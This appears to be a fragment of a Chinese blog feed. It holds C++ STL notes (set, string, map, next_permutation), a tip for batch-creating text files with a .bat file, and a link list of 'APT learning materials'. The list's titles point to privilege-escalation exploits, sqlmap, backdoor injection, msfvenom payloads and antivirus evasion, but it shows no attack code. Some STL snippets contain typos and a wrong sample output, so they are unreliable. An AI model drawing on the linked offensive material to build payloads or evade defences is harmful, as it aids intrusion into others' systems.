class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">4.</span>查询有否元素x<br><span class="hljs-keyword">int</span> hav = s.count(x); <span class="hljs-comment">//有则返回1，无则返回0</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">5.</span>查找x并返回迭代器<br><span class="hljs-built_in">set</span>&lt;<span class="hljs-keyword">int</span>&gt;::iterator it = s.find(x);<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">6.</span>判断是否为空集<br><span class="hljs-keyword">bool</span> isempty = s.empty();<span class="hljs-comment">//若为空集则返回真，否则返回假</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">7.</span>求集合元素个数<br><span class="hljs-keyword">int</span> n = s.size();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">8.</span>删除元素x<br>s.erase(x);<br></code></pre></div></td></tr></table></figure><h6 id="3）用法注意"><a href="#3）用法注意" class="headerlink" title="3）用法注意"></a>3）用法注意</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><span class="hljs-built_in">set</span>最主要用途：自动去重并按升序排序<br><span class="hljs-number">2.</span>如若对<span class="hljs-built_in">set</span>中的元素降序排序，则<br><span class="hljs-built_in">set</span>声明<br>    <span class="hljs-built_in">set</span>&lt;<span class="hljs-keyword">int</span>,greater&lt;<span class="hljs-keyword">int</span>&gt; &gt; st;<br>迭代器也随之改变<br>    <span class="hljs-built_in">set</span>&lt;<span class="hljs-keyword">int</span>,greater&lt;<span class="hljs-keyword">int</span>&gt; &gt;::iterator it;<br>如若<span class="hljs-keyword">int</span>类型改为结构体时，排序就在结构体中加载小于符号<br><span class="hljs-number">3.</span><span class="hljs-built_in">set</span>只能通过迭代器(iterator)访问<br><span class="hljs-number">4.</span><span class="hljs-built_in">set</span>不支持 it &lt; st.end() 的写法，可写成 it != st.end() <br></code></pre></div></td></tr></table></figure><hr><h3 id="6-string类"><a href="#6-string类" class="headerlink" title="6.string类"></a>6.string类</h3><h6 id="1）string对象的声明"><a href="#1）string对象的声明" class="headerlink" title="1）string对象的声明"></a>1）string对象的声明</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><span class="hljs-built_in">string</span> str;<br><span class="hljs-number">2.</span><span class="hljs-built_in">string</span> strl=<span class="hljs-string">&quot;qwertyuui&quot;</span>;<br></code></pre></div></td></tr></table></figure><h6 id="2）求string对象的长度"><a href="#2）求string对象的长度" class="headerlink" title="2）求string对象的长度"></a>2）求string对象的长度</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">string</span> strTest=<span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-number">1.</span> strTest.length(); <span class="hljs-comment">//结果为4</span><br><span class="hljs-number">2.</span> strTest.size(); <span class="hljs-comment">//结果为4</span><br></code></pre></div></td></tr></table></figure><h6 id="3）string对象的连接"><a href="#3）string对象的连接" class="headerlink" title="3）string对象的连接"></a>3）string对象的连接</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">可以使用+和+=运算符对<span class="hljs-built_in">string</span>对象执行字符串的连接操作(还有append成员函数实现字符串连接，忽略之)<br></code></pre></div></td></tr></table></figure><h6 id="4）string对象的比较"><a href="#4）string对象的比较" class="headerlink" title="4）string对象的比较"></a>4）string对象的比较</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">可以用 &lt;、&lt;=、==、!=、&gt;=、&gt; 运算符比较<span class="hljs-built_in">string</span>对象(还有compare成员函数用于比较字符串，忽略之)<br></code></pre></div></td></tr></table></figure><h6 id="5）求string对象的字串"><a href="#5）求string对象的字串" class="headerlink" title="5）求string对象的字串"></a>5）求string对象的字串</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">substr 成员函数可以用于求字串(n,m)<br>调用时，如果省略m或者m超过了字符串的长度，则求出来的字串就是从下标n开始一直到字符串结束的部分<br><span class="hljs-built_in">string</span> s1=<span class="hljs-string">&quot;this is ok&quot;</span>;<br><span class="hljs-number">1.</span><span class="hljs-built_in">string</span> s2=s1.substr(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>); <span class="hljs-comment">//s2=&quot;is i&quot;</span><br><span class="hljs-number">2.</span>s2=s1.substr(<span class="hljs-number">2</span>);<span class="hljs-comment">// s2=&quot;is is ok&quot;</span><br></code></pre></div></td></tr></table></figure><h6 id="6）插入字符串"><a href="#6）插入字符串" class="headerlink" title="6）插入字符串"></a>6）插入字符串</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">insert 成员函数可以在<span class="hljs-built_in">string</span>对象中插入另一个字符串，返回值为对象自身的引用<br>string s1(&quot;Limitless&quot;), s2(&quot;00&quot;);<br><span class="hljs-number">1.</span> s1.insert(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;123&quot;</span>); <span class="hljs-comment">//&quot;Li123mitless&quot;</span><br><span class="hljs-number">2.</span> s1.insert(<span class="hljs-number">3</span>,s2); <span class="hljs-comment">//s1=&quot;Li10023mitless&quot;</span><br><span class="hljs-number">3.</span> s1.insert(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;x&#x27;</span>);<span class="hljs-comment">//s1=&quot;Li1xxxxx0023mitless&quot;</span><br></code></pre></div></td></tr></table></figure><h6 id="7）删除字串"><a href="#7）删除字串" class="headerlink" title="7）删除字串"></a>7）删除字串</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">erase 成员函数可以删除<span class="hljs-built_in">string</span>对象中的字串，返回值为对象自身的引用<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">s1</span><span class="hljs-params">(<span class="hljs-string">&quot;Real Steel&quot;</span>)</span></span>;<br><span class="hljs-number">1.</span> s1.erase(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<span class="hljs-comment">//s1=&quot;R Steel&quot;</span><br><span class="hljs-number">2.</span> s1.erase(<span class="hljs-number">5</span>);<span class="hljs-comment">//s1=&quot;R Ste&quot;</span><br></code></pre></div></td></tr></table></figure><h6 id="8）交换两个string对象的内容"><a href="#8）交换两个string对象的内容" class="headerlink" title="8）交换两个string对象的内容"></a>8）交换两个string对象的内容</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">swap成员函数可以交换两个<span class="hljs-built_in">string</span>对象的内容<br>string s1(&quot;West&quot;),s2(&quot;East&quot;);<br>s1.swap(s2);<span class="hljs-comment">//s1=&quot;East&quot;,s2=&quot;West&quot;</span><br></code></pre></div></td></tr></table></figure><h6 id="9）字符串的查找操作"><a href="#9）字符串的查找操作" class="headerlink" title="9）字符串的查找操作"></a>9）字符串的查找操作</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">string</span> str=<span class="hljs-string">&quot;The apple thinks apple is delicious&quot;</span>; <span class="hljs-comment">//长度34</span><br><span class="hljs-built_in">string</span> key=<span class="hljs-string">&quot;apple&quot;</span>;<br><span class="hljs-number">1.</span> <span class="hljs-keyword">int</span> pos1=str.find(key);<span class="hljs-comment">//4</span><br>    s.find(str),查找字符串str在当前字符串s中第一次出现的位置<br><span class="hljs-number">2.</span> <span class="hljs-keyword">int</span> pos2=str.find(key,<span class="hljs-number">10</span>);<span class="hljs-comment">//17</span><br>    s.find(str,pos),查找字符串str在当前字符串s的[pos,end]中第一次出现的位置，即从pos开始到字符串的最后，str第一次出现的位置<br></code></pre></div></td></tr></table></figure><h6 id="10）用STL算法操作string对象"><a href="#10）用STL算法操作string对象" class="headerlink" title="10）用STL算法操作string对象"></a>10）用STL算法操作string对象</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">s</span><span class="hljs-params">(<span class="hljs-string">&quot;afgcbed&quot;</span>)</span></span>;<br>sort(s.begin(),s,end());<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<span class="hljs-comment">//输出abcdefg</span><br>next_permutation(s.begin(),s,end());<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<span class="hljs-comment">//输出abcdegf</span><br>reverse(s.begin(),s,end());<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<span class="hljs-comment">//fgedcba</span><br></code></pre></div></td></tr></table></figure><h6 id="11）String其他有用函数"><a href="#11）String其他有用函数" class="headerlink" title="11）String其他有用函数"></a>11）String其他有用函数</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span> 截取子串<br>       s.substr(pos, n)    截取s中从pos开始（包括<span class="hljs-number">0</span>）的n个字符的子串，并返回<br>       s.substr(pos)        截取s中从从pos开始（包括<span class="hljs-number">0</span>）到末尾的所有字符的子串，并返回<br><span class="hljs-number">2.</span> 替换子串<br>       s.replace(pos, n, s1)    用s1替换s中从pos开始（包括<span class="hljs-number">0</span>）的n个字符的子串<br><span class="hljs-number">3.</span> 查找子串<br>       s.find(s1)         查找s中第一次出现s1的位置，并返回（包括<span class="hljs-number">0</span>）<br>       s.rfind(s1)        查找s中最后次出现s1的位置，并返回（包括<span class="hljs-number">0</span>）<br>       s.find_first_of(s1)       查找在s1中任意一个字符在s中第一次出现的位置，并返回（包括<span class="hljs-number">0</span>）<br>       s.find_last_of(s1)       查找在s1中任意一个字符在s中最后一次出现的位置，并返回（包括<span class="hljs-number">0</span>）<br>       s.fin_first_not_of(s1)         查找s中第一个不属于s1中的字符的位置，并返回（包括<span class="hljs-number">0</span>）<br>       s.fin_last_not_of(s1)         查找s中最后一个不属于s1中的字符的位置，并返回（包括<span class="hljs-number">0</span>）<br>       <br><span class="hljs-number">4.</span><span class="hljs-built_in">string</span>转换成<span class="hljs-keyword">char</span>*字符串<br><span class="hljs-number">1</span>) .data();<br>如：<br><span class="hljs-built_in">string</span> str=<span class="hljs-string">&quot;abc&quot;</span>;<br><span class="hljs-keyword">char</span>*p=(<span class="hljs-keyword">char</span>*)str.data();<br><br><span class="hljs-number">2</span>) .c_str();<br>如：<br><span class="hljs-built_in">string</span> str=<span class="hljs-string">&quot;adcd&quot;</span>;<br><span class="hljs-keyword">char</span> *p=(<span class="hljs-keyword">char</span>*)str.c_str();<br><br></code></pre></div></td></tr></table></figure><hr><h3 id="7-映射-map"><a href="#7-映射-map" class="headerlink" title="7.映射(map)"></a>7.映射(map)</h3><h6 id="1）特点-4"><a href="#1）特点-4" class="headerlink" title="1）特点"></a>1）特点</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">map</span>是一个键值对(key/value)容器，对于迭代器来说，可以修改value，而不能修改key。Map会根据key自动排序<br><span class="hljs-built_in">map</span>类型通常可理解为关联数组：可使用键作为下标来获取一个值。关联的本质在于：元素的值与某个特定的键相关联，而并非通过元素在数组中的位置来获取<br></code></pre></div></td></tr></table></figure><h6 id="2）常见操作-4"><a href="#2）常见操作-4" class="headerlink" title="2）常见操作"></a>2）常见操作</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><span class="hljs-built_in">map</span>的定义<br><span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">string</span>&gt; m;<span class="hljs-comment">//定义一个空map m;</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">2.</span>返回m中键值等于k的元素的个数(<span class="hljs-number">1</span>或<span class="hljs-number">0</span>)<br>m.count(k);<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">3.</span>查找元素<br>m.find(k);<span class="hljs-comment">//存在则返回指向该元素的迭代器，否则返回结束地址end()</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">4.</span>删除元素<br>m.erase(k);<span class="hljs-comment">//删除m中键为k的元素，返回删除元素的个数(1或0)</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">5.</span>删除迭代器指向的元素<br>m.erase(p);<span class="hljs-comment">//从m中删除迭代器p所指向的元素</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">6.</span>插入元素<br>m.insert(e);<span class="hljs-comment">//e是一个用在m上的value_type类型的值(一个pair)。如果键e.first不在m中，则插入一个值为e.second的新元素；如果该键在m中已存在，那么不进行任何操作</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">7.</span>清空元素<br>m.clear();<span class="hljs-comment">//清空m</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="8-STL中的算法"><a href="#8-STL中的算法" class="headerlink" title="8.STL中的算法"></a>8.STL中的算法</h3><h6 id="1）全排序-next-permutation"><a href="#1）全排序-next-permutation" class="headerlink" title="1）全排序(next_permutation)"></a>1）全排序(next_permutation)</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">通常用于生成序列的全排列<br><span class="hljs-keyword">int</span> a[]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-keyword">do</span>&#123;<br>    <span class="hljs-built_in">cout</span>&lt;&lt;a[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;a[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;a[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<span class="hljs-keyword">while</span>(next_permutation(a,a+<span class="hljs-number">3</span>))<br><span class="hljs-number">1.</span>若当前调用排序已经达到最大字典序，比如<span class="hljs-number">321</span>，则函数返回<span class="hljs-literal">false</span>;<br><span class="hljs-number">2.</span>修改函数的参数，比如(a,a+<span class="hljs-number">2</span>),则可以只对部分长度全排列<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">next_permutation是如何生成序列的全排列？<br><span class="hljs-number">1.</span>从最右边开始，两两比较相邻的元素，直至找到右边比左边大的一对，左边那个就是将要被替换的，再从最右边开始找比这个元素大的第一个，交换他们两个.<br><span class="hljs-number">2.</span>交换之后，翻转交换元素的后面的所有元素<br><span class="hljs-number">3.</span>比如：<span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">4</span> <span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>2021杭电ACM-LCY算法培训进阶班</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>实现批量生成文本/文件等</title>
    <link href="/2021/03/07/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%90%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6/"/>
    <url>/2021/03/07/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%90%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>在工作或者生活中，可能会遇见需要批量生成一些文本或者文件夹的情况，今天以批量生成txt文本为例，教大家怎么批量新建文档的技巧。同样适用于创建其他文本或文档等。</p><h2 id="方法-步骤"><a href="#方法-步骤" class="headerlink" title="方法/步骤"></a>方法/步骤</h2><h3 id="1-第一步"><a href="#1-第一步" class="headerlink" title="1.第一步"></a>1.第一步</h3><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">首先在C盘任意的地方新建一个文件夹或文本，比如在桌面新建一个txt文本，名称任意起就行了。<br>这里以建一个 <span class="hljs-keyword">test</span>.txt 文本为例。<br></code></pre></div></td></tr></table></figure><h3 id="2-第二步"><a href="#2-第二步" class="headerlink" title="2.第二步"></a>2.第二步</h3><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">打开office工具中的Excel表格文件，在任意中输入 <span class="hljs-keyword">c</span>:&gt;<span class="hljs-number">1</span>.txt <br></code></pre></div></td></tr></table></figure><p><strong>注意：在C盘建的输 c:&gt;1.txt ，如果是在其他盘则写其他盘，如在D盘：d:&gt;1.txt</strong></p><h3 id="3-第三步"><a href="#3-第三步" class="headerlink" title="3.第三步"></a>3.第三步</h3><figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode">让向下填充任意<span class="hljs-comment">(这里以生成20个文本为例)</span>，直接往下拉就行了，然后选择填充序列。<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210407220650162.png"></p><h3 id="4-第四步"><a href="#4-第四步" class="headerlink" title="4.第四步"></a>4.第四步</h3><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">然后把刚才弄好的序列，复制到 <span class="hljs-keyword">test</span>.txt 里面.<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210407221114533.png"></p><h3 id="5-第五步"><a href="#5-第五步" class="headerlink" title="5.第五步"></a>5.第五步</h3><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">修改 <span class="hljs-keyword">test</span>.txt 文本的后缀为 bat ,即改为 <span class="hljs-keyword">test</span>.bat<br>如果看不见文本的后缀，需要开启显示后缀。可自行百度。<br></code></pre></div></td></tr></table></figure><h3 id="6-第六步"><a href="#6-第六步" class="headerlink" title="6.第六步"></a>6.第六步</h3><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">双击 <span class="hljs-keyword">test</span>.bat 即可看见生成了对应数量的文本。<br></code></pre></div></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs plain">不一定要在excel表格中去弄，这样只是方便些。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>APT学习资料库</title>
    <link href="/2021/03/07/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/APT%E8%B5%84%E6%96%99%E4%B8%8B%E8%BD%BD/"/>
    <url>/2021/03/07/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/APT%E8%B5%84%E6%96%99%E4%B8%8B%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<p>APT相关的学习资料下载。</p><h2 id="资料下载目录"><a href="#资料下载目录" class="headerlink" title="资料下载目录"></a>资料下载目录</h2><h3 id="1-windows提权-快速查找exp"><a href="#1-windows提权-快速查找exp" class="headerlink" title="1.windows提权-快速查找exp"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/windows%E6%8F%90%E6%9D%83-%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BEexp%EF%BC%88%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%89.docx">1.windows提权-快速查找exp</a></h3><h3 id="2-Linux提权-依赖exp篇"><a href="#2-Linux提权-依赖exp篇" class="headerlink" title="2.Linux提权-依赖exp篇"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/Linux%E6%8F%90%E6%9D%83-%E4%BE%9D%E8%B5%96exp%E7%AF%87%20%EF%BC%88%E7%AC%AC%E4%BA%8C%E8%AF%BE%EF%BC%89.docx">2.Linux提权-依赖exp篇</a></h3><h3 id="5-工具介绍-Sqlmap"><a href="#5-工具介绍-Sqlmap" class="headerlink" title="5.工具介绍-Sqlmap"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-Sqlmap%EF%BC%88%E7%AC%AC%E4%BA%94%E8%AF%BE%EF%BC%89.docx">5.工具介绍-Sqlmap</a></h3><h3 id="6-反攻的一次溯源–项目实战3"><a href="#6-反攻的一次溯源–项目实战3" class="headerlink" title="6.反攻的一次溯源–项目实战3"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%8F%8D%E6%94%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90--%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%983%EF%BC%88%E7%AC%AC%E5%85%AD%E8%AF%BE%EF%BC%89.docx">6.反攻的一次溯源–项目实战3</a></h3><h3 id="7-sql-server-常用操作远程桌面语句"><a href="#7-sql-server-常用操作远程桌面语句" class="headerlink" title="7.sql server 常用操作远程桌面语句"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/sql%20server%20%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%AF%AD%E5%8F%A5%EF%BC%88%E7%AC%AC%E4%B8%83%E8%AF%BE%EF%BC%89.docx">7.sql server 常用操作远程桌面语句</a></h3><h3 id="8-模拟诉求任务攻击"><a href="#8-模拟诉求任务攻击" class="headerlink" title="8.模拟诉求任务攻击"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E6%A8%A1%E6%8B%9F%E8%AF%89%E6%B1%82%E4%BB%BB%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88%E7%AC%AC%E5%85%AB%E8%AF%BE%EF%BC%89.docx">8.模拟诉求任务攻击</a></h3><h3 id="9-工具介绍-the-backdoor-factory"><a href="#9-工具介绍-the-backdoor-factory" class="headerlink" title="9.工具介绍-the-backdoor-factory"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-the-backdoor-factory%EF%BC%88%E7%AC%AC%E4%B9%9D%E8%AF%BE%EF%BC%89.docx">9.工具介绍-the-backdoor-factory</a></h3><h3 id="10-msfvenom常用生成payload命令"><a href="#10-msfvenom常用生成payload命令" class="headerlink" title="10.msfvenom常用生成payload命令"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/msfvenom%E5%B8%B8%E7%94%A8%E7%94%9F%E6%88%90payload%E5%91%BD%E4%BB%A4%EF%BC%88%E7%AC%AC%E5%8D%81%E8%AF%BE%EF%BC%89.docx">10.msfvenom常用生成payload命令</a></h3><h3 id="11-工具介绍Veil-Evasion"><a href="#11-工具介绍Veil-Evasion" class="headerlink" title="11.工具介绍Veil-Evasion"></a><a 